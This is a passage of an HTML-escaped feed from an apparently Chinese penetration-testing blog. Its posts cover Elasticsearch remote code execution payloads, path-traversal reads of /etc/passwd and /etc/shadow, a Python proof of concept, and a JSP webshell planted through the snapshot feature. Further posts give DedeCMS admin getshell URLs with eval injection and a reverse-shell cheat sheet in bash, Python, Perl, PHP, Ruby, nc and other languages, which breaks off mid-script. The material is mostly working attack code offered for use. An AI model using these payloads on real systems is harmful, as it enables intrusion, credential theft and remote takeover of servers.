&quot;query&quot;: &#123;</div><div class="line">      &quot;filtered&quot;: &#123;</div><div class="line">        &quot;query&quot;: &#123;</div><div class="line">          &quot;match_all&quot;: &#123;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;,</div><div class="line">    &quot;script_fields&quot;: &#123;</div><div class="line">        &quot;command&quot;: &#123;</div><div class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="其他资料："><a href="#其他资料：" class="headerlink" title="其他资料："></a>其他资料：</h5><p>（1）dockerfile地址<br><a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120</a><br><br>（2）<a href="https://www.t00ls.net/viewthread.php?tid=29408" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=29408</a><br><br>（3）<a href="http://bouk.co/blog/elasticsearch-rce" target="_blank" rel="external">http://bouk.co/blog/elasticsearch-rce</a><br></p><h4 id="1-2-（CVE-2015-1427）ElasticSearch-Groovy-v1-4-2以下-–-沙盒绕过-amp-amp-代码执行漏洞"><a href="#1-2-（CVE-2015-1427）ElasticSearch-Groovy-v1-4-2以下-–-沙盒绕过-amp-amp-代码执行漏洞" class="headerlink" title="1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞"></a>1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞</h4><h5 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h5><p>Java沙盒绕过法：</p><blockquote><p>java.lang.Math.class.forName(“java.lang.Runtime”).getRuntime().exec(“id”).getText()</p></blockquote><p>Goovy直接执行命令法：</p><blockquote><p>def command=’id’;def res=command.execute().text;res</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/_search?pretty </div><div class="line">postdata:</div><div class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h5 id="其他资料：-1"><a href="#其他资料：-1" class="headerlink" title="其他资料："></a>其他资料：</h5><p>(1）dockerfile地址:<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427</a><br><br>(2）<a href="http://cb.drops.wiki/drops/papers-5107.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-5107.html</a><br><br>(3）<a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427" target="_blank" rel="external">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</a><br><br>(4）<a href="https://github.com/XiphosResearch/exploits" target="_blank" rel="external">https://github.com/XiphosResearch/exploits</a><br><br>(5）<a href="http://cb.drops.wiki/drops/papers-5142.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-5142.html</a><br></p><h4 id="1-3（CVE-2015-3337）ElasticSearch-1-4-5以下-1-5-2以下-–-目录穿越漏洞"><a href="#1-3（CVE-2015-3337）ElasticSearch-1-4-5以下-1-5-2以下-–-目录穿越漏洞" class="headerlink" title="1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞"></a>1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞</h4><h5 id="利用：-2"><a href="#利用：-2" class="headerlink" title="利用："></a>利用：</h5><p>读服务器上文件：burpsuite的repeater中访问url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_plugin/head/../../../../../../../../../etc/passwd</div></pre></td></tr></table></figure><h5 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h5><p>（1）原理：在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。<br><br>（2）dockerfile地址：<a href="https://github.com/vulhub/vulhub/pulse" target="_blank" rel="external">https://github.com/vulhub/vulhub/pulse</a><br></p><h4 id="1-4-（CVE-2015-5531）ElasticSearch-1-6-1以下-–-目录穿越漏洞"><a href="#1-4-（CVE-2015-5531）ElasticSearch-1-6-1以下-–-目录穿越漏洞" class="headerlink" title="1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞"></a>1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞</h4><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>该漏洞在elasticsearch 1.5.1及以前，无需任何配置即可触发。之后的新版，<em>配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能</em>。</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>1、创建一个仓库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">puturl: /_snapshot/test</div><div class="line"></div><div class="line">putdata:</div><div class="line">&#123;</div><div class="line">    &quot;type&quot;: &quot;fs&quot;,</div><div class="line">    &quot;settings&quot;: &#123;</div><div class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>2、创建一个快照：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">puturl: /_snapshot/test2</div><div class="line"></div><div class="line">putdata:</div><div class="line">&#123;</div><div class="line">    &quot;type&quot;: &quot;fs&quot;,</div><div class="line">    &quot;settings&quot;: &#123;</div><div class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3、目录穿越访问服务器文件，在burpsuite 中repeater访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</div></pre></td></tr></table></figure></p><p>4、从repeater中将错误信息解码，即可得到对应服务器文件（passwd）信息。</p><h5 id="其他资料：-2"><a href="#其他资料：-2" class="headerlink" title="其他资料："></a>其他资料：</h5><p>（1）原理：elasticsearch中备份的快照保存在备份仓库中的命名格式是以snapshot-xxx的格式,所以snapshot-backdata 会被误以为是test仓库的backdata快照，快照都是文件形式保存的，而snapshot-backdata是目录，elasticsearch 没有区分，如果elasticsearch发现其是目录之后，就继续读取目录下的内容，如果目录下的文件明称是恶意构造的(类似../../../) elasticsearch就会去读取这个递归读取文件的内容（这里elasticsearch没有过滤..），从而导致目录遍历（任意文件内容读取）<br><br>（2）dockerfile地址：<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531</a><br><br>（3）python poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf8 -*-</div><div class="line">&quot;&quot;&quot;</div><div class="line">PoC for CVE-2015-5531</div><div class="line">Affects ElasticSearch 1.6.0 and prior</div><div class="line">&quot;&quot;&quot;</div><div class="line">import re</div><div class="line">import sys</div><div class="line">import json</div><div class="line">import requests</div><div class="line">import urllib</div><div class="line">import argparse</div><div class="line">import traceback</div><div class="line">import termcolor</div><div class="line">def colorize_red(string):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param string:</div><div class="line">    :return</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    return termcolor.colored(string, &apos;red&apos;)</div><div class="line">def colorize_green(string):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param string:</div><div class="line">    :return:</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    return termcolor.colored(string, &apos;green&apos;)</div><div class="line">def create_repos(base_url):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param base_url:</div><div class="line">    :return: None</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for index, repo_name in enumerate(REPO_NAME_LST):</div><div class="line">        </div><div class="line">        url = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(base_url, repo_name)</div><div class="line">        req = requests.post(url, json=DATA_REPO_LST[index])</div><div class="line">         </div><div class="line">        if “acknowledged” in req.json():</div><div class="line">            print colorize_green(“repository &#123;0&#125;: create success”.format(repo_name))</div><div class="line">def grab_file(vuln_url):</div><div class="line">    “”&quot;</div><div class="line">    :param xplurl:</div><div class="line">    :return:</div><div class="line">    “”&quot;</div><div class="line">    </div><div class="line">    req = requests.get(vuln_url)</div><div class="line">    if req.status_code == 400:</div><div class="line">        data = req.json()</div><div class="line">        extrdata = re.findall(r’\d+’, str(data[&apos;error&apos;]))</div><div class="line">        decoder = bytearray()</div><div class="line">        for i in extrdata[2:]:</div><div class="line">            decoder.append(int(i))</div><div class="line">        print colorize_green(decoder)</div><div class="line">def exploit(**args):</div><div class="line">    “”&quot;</div><div class="line">    :param args:</div><div class="line">    :return:</div><div class="line">    “”&quot;</div><div class="line">    target = args[&apos;target&apos;]</div><div class="line">    port = args[&apos;port&apos;]</div><div class="line">    fpath = args[&apos;fpath&apos;].split(‘,’)</div><div class="line">    fpath = [urllib.quote(fp, safe=&apos;&apos;) for fp in fpath]</div><div class="line">    base_url = “http://&#123;0&#125;:&#123;1&#125;/_snapshot/”.format(target, port)</div><div class="line">    #create elasticsearch repository for snapshot</div><div class="line">    create_repos(base_url)</div><div class="line">    #grab files</div><div class="line">    for fp in fpath:</div><div class="line">        vuln_url = ‘&#123;0&#125;&#123;1&#125;/&#123;2&#125;&#123;3&#125;’.format(base_url, REPO_NAME_LST[0], FCK, fp)</div><div class="line">        print colorize_red(urllib.unquote(fp)) + “:\n”</div><div class="line">        grab_file(vuln_url)</div><div class="line">if __name__ == “__main__”:</div><div class="line">    # for global</div><div class="line">    FCK = ‘backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..’</div><div class="line">    REPO_NAME_LST = [&apos;test11&apos;, &apos;test12&apos;]</div><div class="line"> </div><div class="line">   DATA_REPO_LST = [&#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </div><div class="line">&quot;/tmp/test30&quot;&#125;&#125;, &#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </div><div class="line">&quot;/tmp/test30/snapshot-backdata&quot;&#125;&#125;]</div><div class="line">    parser = argparse.ArgumentParser(usage=”python cve-2015-5531.py options”,</div><div class="line">                                     description=”cve-2015-5531 Vuln PoC”, add_help=True)</div><div class="line">    parser.add_argument(‘-t’, ‘–target’, metavar=’TARGET’, type=str, dest=”target”, required=True, help=’eg: 127.0.0.1 or www.baidu.com’)</div><div class="line"> </div><div class="line">   parser.add_argument(‘-p’, ‘–port’, metavar=’PORT’, dest=’port’, </div><div class="line">type=int, default=9200, help=’elasticsearch port default 9200′)</div><div class="line">   </div><div class="line"> parser.add_argument(‘–fpath’, metavar=’FPATH’, dest=’fpath’, type=str,</div><div class="line"> default=’/etc/passwd,/etc/shadow’, help=’file to grab multi files </div><div class="line">separated by comma ‘)</div><div class="line">    args = parser.parse_args()</div><div class="line">    try:</div><div class="line">        exploit(**args.__dict__)</div><div class="line">    except:</div><div class="line">        traceback.print_exc()</div></pre></td></tr></table></figure><h4 id="1-5（WooYun-2015-110216）Elasticsearch（1-5-x以下）–-写入webshell漏洞"><a href="#1-5（WooYun-2015-110216）Elasticsearch（1-5-x以下）–-写入webshell漏洞" class="headerlink" title="1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞"></a>1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞</h4><h5 id="说明：-1"><a href="#说明：-1" class="headerlink" title="说明："></a>说明：</h5><p>1、原理：<br>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。<br>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p><p>2、利用方式：<br>在获取其他web服务的根目录后，直接使用ES写入对应木马文件至解析目录即可。<br>如tomcat服务web解析目录为：/usr/local/tomcat/webapps。<br>首先建立一个恶意索引文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&apos;</div><div class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</div><div class="line">&apos;</div></pre></td></tr></table></figure></p><p>再创建一个恶意的存储库，其中location的值即为我要写入的路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">curl -XPUT &apos;http://ip:9200/_snapshot/yz.jsp&apos; -d &apos;&#123;</div><div class="line">     &quot;type&quot;: &quot;fs&quot;,</div><div class="line">     &quot;settings&quot;: &#123;</div><div class="line">          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot&quot;,</div><div class="line">          &quot;compress&quot;: false</div><div class="line">     &#125;</div><div class="line">&#125;&apos;</div></pre></td></tr></table></figure></p><p>存储库验证并创建:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &apos;&#123;</div><div class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</div><div class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</div><div class="line">     &quot;include_global_state&quot;: false</div><div class="line">&#125;&apos;</div></pre></td></tr></table></figure></p><p>最后访问写入的webshell即可：</p><blockquote><p><a href="http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp" target="_blank" rel="external">http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp</a></p></blockquote><p>上面的jsp文件作用为向wwwroot目录下的test.jsp文件写入任意字符如访问下面：</p><blockquote><p><a href="http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test" target="_blank" rel="external">http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test</a><br>将test.jsp中写入test。只需访问<a href="http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。" target="_blank" rel="external">http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。</a></p></blockquote><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>(1) 原理地址：<a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html" target="_blank" rel="external">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a><br><br>(2）dockerfile地址：<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216</a><br></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0-因&quot;&gt;&lt;a href=&quot;#0-因&quot; class=&quot;headerlink&quot; title=&quot;0.因&quot;&gt;&lt;/a&gt;0.因&lt;/h3&gt;&lt;p&gt;众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="Elsaticsearch" scheme="http://sunu11.com/tags/Elsaticsearch/"/>
    
  </entry>
  
  <entry>
    <title>心悸</title>
    <link href="http://sunu11.com/2018/05/21/%E5%BF%83%E6%82%B8/"/>
    <id>http://sunu11.com/2018/05/21/心悸/</id>
    <published>2018-05-21T15:53:53.000Z</published>
    <updated>2018-08-23T06:23:16.363Z</updated>
    
    <content type="html"><![CDATA[<p>此文永在心中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;此文永在心中&lt;/p&gt;

      
    
    </summary>
    
      <category term="岁月" scheme="http://sunu11.com/categories/%E5%B2%81%E6%9C%88/"/>
    
    
      <category term="生活" scheme="http://sunu11.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7 SP2后台漏洞小集合</title>
    <link href="http://sunu11.com/2018/04/03/19/"/>
    <id>http://sunu11.com/2018/04/03/19/</id>
    <published>2018-04-03T06:20:22.000Z</published>
    <updated>2018-11-10T12:10:01.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="记录一下最新版dedecms后台拿服务器的几个方式。"><a href="#记录一下最新版dedecms后台拿服务器的几个方式。" class="headerlink" title="记录一下最新版dedecms后台拿服务器的几个方式。"></a>记录一下最新版dedecms后台拿服务器的几个方式。</h3><p><strong>01、上传shell</strong></p><p>1、后台上传flash文件处未对文件内容作校验，可直接上传shell。<br>2、通过重命名功能：<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php</div></pre></td></tr></table></figure><p><strong>02、写入配置</strong><br>/dede/sys_verifies.php中可写进恶意代码至inc文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</div></pre></td></tr></table></figure><p><strong>03、数据库写入数据未过滤：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1</div></pre></td></tr></table></figure><p>查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</div><div class="line">or:</div><div class="line">http://localhost/data/enums/;phpinfo();$.php</div></pre></td></tr></table></figure><p><strong>05、模板问题：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;a href=&quot;#记录一下最新版dedecms后台拿服务器的几个方式。&quot; class=&quot;headerlink&quot; title=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;/a&gt;记录一下最新版dedecms后台拿服务器的几个方式。&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;01、上传shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、后台上传flash文件处未对文件内容作校验，可直接上传shell。&lt;br&gt;2、通过重命名功能：
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Dedecms" scheme="http://sunu11.com/tags/Dedecms/"/>
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之反弹shell的几种姿势</title>
    <link href="http://sunu11.com/2018/01/26/18/"/>
    <id>http://sunu11.com/2018/01/26/18/</id>
    <published>2018-01-26T04:19:50.000Z</published>
    <updated>2018-11-03T11:58:16.005Z</updated>
    
    <content type="html"><![CDATA[<h3 id="主要反弹方式"><a href="#主要反弹方式" class="headerlink" title="主要反弹方式"></a>主要反弹方式</h3><blockquote><p>首先vps监听：<code>nc –l –vv –p port</code><a id="more"></a></p></blockquote><p><strong>1.bash反弹</strong><br>利用系统特殊设备文件/dev/tcp建立socket发出去，达到反弹shell的效果<br><code>bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p><p><strong>2.telnet反弹</strong><br>适用于nc不可用或者/dev/tcp不可用条件下，其中mknod是创建设备文件<br><code>mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test</code></p><p><strong>3.Java</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure></p><p><strong>4.Ruby</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure></p><p>不依赖于/bin/sh的shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure></p><p><strong>5.PHP</strong><br><code>php -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><strong>6.Python(2.7)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure></p><p>另外的形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure></p><p><strong>7.Perl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure></p><p>不依赖于/bin/sh的shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/18.2.jpg" alt="18-1"></p><p><strong>8.nc</strong><br>linux：<code>nc -e /bin/sh ip port</code><br>Windows：<code>nc -e cmd.exe ip port</code><br>当不能使用-e参数时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</div><div class="line">/bin/sh | nc ip port</div><div class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ip port 0/tmp/</div></pre></td></tr></table></figure></p><p>nc版本有问题时：<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code></p><p><strong>9.lua</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</div></pre></td></tr></table></figure></p><p><strong>10.gawk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/gawk -f</div><div class="line"></div><div class="line">BEGIN &#123;</div><div class="line">        Port    =       8080</div><div class="line">        Prompt  =       &quot;bkd&gt; &quot;</div><div class="line"></div><div class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</div><div class="line">        while (1) &#123;</div><div class="line">                do &#123;</div><div class="line">                        printf Prompt |&amp; Service</div><div class="line">                        Service |&amp; getline cmd</div><div 